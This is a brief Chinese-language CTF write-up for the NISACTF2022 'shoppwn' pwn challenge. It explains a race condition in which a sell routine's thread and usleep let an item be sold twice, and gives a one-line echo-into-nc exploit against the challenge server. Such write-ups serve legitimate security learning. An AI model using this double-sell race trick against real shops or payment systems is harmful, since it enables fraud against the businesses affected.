---
title: NISACTF2022-shoppwn-wp
date: 2023-06-13 15:03:26
tags:
- CTF
- pwn
- thread
- NISACTF2022
- nssctf
categories:
- pwn-wp
---
[相关资源](https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/NISACTF2022-shoppwn-wp)  
## 0x1 分析
![img](https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/NISACTF2022-shoppwn-wp/0x1.png?raw=true)  
![img](https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/NISACTF2022-shoppwn-wp/0x2.png?raw=true)  
sell的时候使用pthread_create，其中有usleep，只要发送速度足够快，可以卖出两次

## 0x2 exp
```shell
echo -e '3\n0\n3\n0\n2\n1\n1\n' | nc node3.anna.nssctf.cn 28736
# sell pen
# sell pen
# buy flag
# show
```